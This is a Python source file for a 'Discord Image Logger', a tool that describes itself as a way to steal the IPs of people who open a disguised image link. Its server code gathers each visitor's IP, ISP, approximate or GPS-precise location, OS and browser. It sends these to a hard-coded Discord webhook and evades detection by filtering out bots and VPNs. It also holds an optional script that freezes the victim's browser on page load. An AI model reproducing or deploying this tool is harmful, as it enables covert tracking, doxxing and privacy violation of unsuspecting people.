# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445083471532789851/CDFf-4gOSiLmpkH3vJA9YslI0LRccr-fIDo6hsIjYMNA_bKDUz8l8fmCx6R3SwjfIFYp",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
